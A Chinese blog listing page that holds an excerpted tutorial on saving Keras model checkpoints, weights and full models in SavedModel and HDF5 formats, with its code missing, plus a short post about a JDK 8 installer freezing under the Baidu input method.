	</header>
	<div class="content list__excerpt post__content clearfix">
		模型在训练过程中或者在训练之后，模型的执行过程能被保存，也就是，模型能从暂停中恢复以免训练的时间过长。因此，被保存的模型可以被共享，其他人可以重新构建相同的模型。被保存的模型以如下的两种方式进行共享：
创建模型的代码
被训练模型的权重或者参数
安装类库
如上所示，安装保存模型的类库、工具集，并导入其支持的函数，其中，以HDF5的文件格式保存模型。
加载数据样本
如上所示，加载mnist训练数据集，该数据集是流行服饰的图片数据集，其中，train_images是训练的图片数据集，train_labels是训练的标签数据集，分别使用mnist数据集的前1000条记录。
定义模型
如上所示，定义创建序列模型的函数、创建模型，其中，该模型仅定义一个全连接层、每层512个单元、使用删除正则化机制、使用Adam优化器优化模型。
保存检查点
检查点是用于保证训练过程的可用性，当训练过程被中断，设置检查点可以保存中断之前的训练数据，例如，保存了训练过程的权重或者参数，用户可以从检查点中恢复训练。Keras技术框架提供tf.keras.callbacks.ModelCheckpoint工具类用于保存训练过程的检查点，用户使用检查点可以持续地保存训练过程或者训练结束的训练数据。
检查点回调（callback）
如上所示，以回调的方式创建了一个模型的检查点，其中，checkpoint_path是保存检查点对应的文件路径，cp_callback是创建一个检查点函数，callbacks=[cp_callback]是为模型设置了训练过程中回调检查点函数、持续地保存训练过程中的检查点，该函数是在每次训练迭代结束的时候被回调，训练多次迭代则多次回调。
如上所示，显示训练结束之后，检查点保存路径下的文件信息。
如上所示，先创建一个模型model，在训练之前对模型执行测试评估，显示其准确度只有7%，使用模型的load_weights函数加载之前训练的检查点，创建一个权重都相同的模型，然后执行测试评估，显示其准确度达到86.60%（重用已训练完成的模型，包括权重）。
检查点选项设置
如上所示，用户可以根据实际情况设置检查点的参数选项，例如，checkpoint_path可以设置每次训练迭代保存的检查点的名称，save_freq设置检查点保存的频率，每多少次训练迭代保存一次检查点，日志显示每5次训练迭代记录一次检查点。
如上所示，显示模型检查点保存的文件列表，以及显示最后一个检查点。
如上所示，使用load_weights函数加载模型的最后一次训练的检查点，其包括该次检查点的权重，然后，执行模型的测试评估，其准确度达到87.30%。
检查点文件属性
检查点文件是二进制格式的字节文件，其中保存了训练过程中学习到的权重信息，其描述如下所示：
一个或者多个分片，每个分片都包含了模型训练所得的权重信息
一个索引文件，对以上的分片文件进行索引
在单节点的机器中训练模型，则生成的其中一个分片的检查点文件的后缀是.data-00000-of-00001。
手动保存权重
如上所示，使用模型的save_weights保存模型的权重，load_weights函数是加载已保存的权重，然后，使用测试数据集对模型执行测试评估，其准确度达到87.30%。
保存完整模型
使用keras技术框架的tf.keras.Model.save函数可以保存完整的模型，该保存方式包括模型的架构、模型权重、模型训练的设置，该保存方式可以让用户直接重用已保存的模型，而不用修改模型的代码，也就是，由于优化器的状态能被恢复，用户可以直接恢复模型到上次训练暂停的时候。该保存方式的包括两种格式，SavedModel以及HDF5，其中，SavedModel是默认的保存格式。
SavedModel格式
如上所示，使用模型的save函数保存完整的已训练完成的模型。
如上所示，显示保存模型的文件列表，然后，使用load_model函数加载已保存的模型，输出模型的汇总信息。
如上所示，重新加载了已训练完成、完整的、相同的模型，然后，使用模型进行测试评估、预测。
HDF5格式
如上所示，创建一个模型、对模型执行训练、以HDF5的格式保存完整的模型。
如上所示，重新加载HDF5格式的已经保存的模型，输出模型汇总信息。
如上所示，使用测试数据集对重新加载的模型执行测试评估，其准确度达到85.90%。
由以上的分析可知，Keras技术框架保存模型的信息如下所示：
模型训练所得的权重值
模型的架构
模型的训练设置，例如，传入到模型compile函数的参数
模型的优化器以及优化器的状态
（未完待续）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/0964cf1db82b90d05ae010319b214f29/" rel="bookmark">
			安装java8 jdk点击下一步无反应
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		先前安装的jdk19,因为开发环境需要更换jdk8，所以卸载了jdk19,下载了JDK-8U341-Windows-X64.exe，但是安装点2下后,就无反应了，上网各种查方法，找到办法亲测好用：把输入法切换到默认输入法。
因为第一次安装时候，就是用的默认输入法，也没意思到这个问题。记录一下哈。
只有百度输入法会发生这个现象！！！
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/113/">«</a>
	<span class="pagination__item pagination__item--current">114/321</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/115/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 编程大白的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>